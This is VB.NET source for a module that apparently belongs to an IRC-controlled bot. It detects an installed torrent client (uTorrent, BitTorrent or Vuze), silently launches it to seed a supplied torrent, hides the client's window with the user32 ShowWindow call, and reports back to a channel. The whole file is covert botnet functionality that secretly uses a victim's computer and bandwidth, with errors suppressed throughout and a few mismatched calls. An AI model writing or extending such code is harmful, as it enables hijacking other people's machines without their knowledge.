Imports System.Threading
Imports System.IO
Imports System.Runtime.InteropServices

Module Torrent
    <DllImport("user32.dll")> Private Function ShowWindow(ByVal hwnd As Integer, ByVal nCmdShow As Integer) As Integer
    End Function
    Public UTorrentPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\uTorrent\uTorrent.exe"
    Public UTorrentLocalPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\uTorrent\uTorrent.exe"
    Public BitTorrentPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\BitTorrent\bittorrent.exe"
    Public BitLocalPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\BitTorrent\BitTorrent.exe"
    Public VuzePath As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\Vuze\Azureus.exe"
    Public VuzeLocalPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Azureus\torrents\"

    Public Sub SeedTorrent(ByVal path As String)
        On Error Resume Next
        If IsVuze() Then
            SeedItVuze(VuzePath, path)
            TalktoChannel("Seeding Torrent With Vuze", String.Empty)
        ElseIf IsBitTorrent() Then
            SeedIt(BitLocalPath, BitLocalPath, path)
            TalktoChannel("Seeding Torrent with BitTorrent", String.Empty)
        ElseIf IsUtorrent() Then
            SeedIt(UTorrentPath, UTorrentLocalPath, path)
            TalktoChannel("Seeding Torrent with uTorrent", String.Empty)
        Else
            TalktoChannel("Unable to Seed: No Torrent Client Installed", String.Empty)
        End If
    End Sub
    Public Function GetFileNameFromURL(ByVal URL As String) As String
        Try
            Return URL.Substring(URL.LastIndexOf("/", System.StringComparison.Ordinal) + 1)
        Catch ex As Exception
            Return URL
        End Try
    End Function
    Public Function IsUtorrent() As Boolean
        On Error Resume Next
        If File.Exists(UTorrentPath) Then
            Return True
        End If
        Return False
    End Function

    Public Function IsBitTorrent() As Boolean
        On Error Resume Next
        If File.Exists(BitLocalPath) Then
            Return True
        End If
        Return False
    End Function

    Public Function IsVuze() As Boolean
        On Error Resume Next
        If File.Exists(VuzePath) Then
            Return True
        End If
        Return False
    End Function

    Public Sub SeedIt(ByVal ClientPath As String, ByVal LocalPath As String, ByVal TorrentPath As String)
        On Error Resume Next
        Dim seed As New ProcessStartInfo()
        seed.FileName = ClientPath
        seed.Arguments = "/DIRECTORY " & LocalPath & " " & """" & TorrentPath & """"
        seed.CreateNoWindow = True
        Dim p As Process = Process.Start(seed)
        If ClientPath.Contains("uTorrent") Then
            HideIt("uTorrent")
        ElseIf ClientPath.Contains("BitTorrent") Then
            HideIt("BitTorrent")
        ElseIf ClientPath.Contains("Azureus") Then
            HideIt("Azureus")
        End If
    End Sub

    Public Sub SeedItVuze(ByVal ClientPath As String, ByVal TorrentURL As String)
        On Error Resume Next
        Dim seed As New ProcessStartInfo()
        seed.FileName = ClientPath
        seed.Arguments = TorrentURL
        seed.CreateNoWindow = True
        Dim p As Process = Process.Start(seed)
        HideIt(p.MainWindowHandle)
        Thread.Sleep(1000)
    End Sub

    Public Sub HideIt(ByVal TorrentClient As String)
        On Error Resume Next
        Thread.Sleep(1000)
        Dim P As Process() = Process.GetProcessesByName(TorrentClient)
        ShowWindow(P(0).MainWindowHandle.ToInt32, 0)
    End Sub
End Module
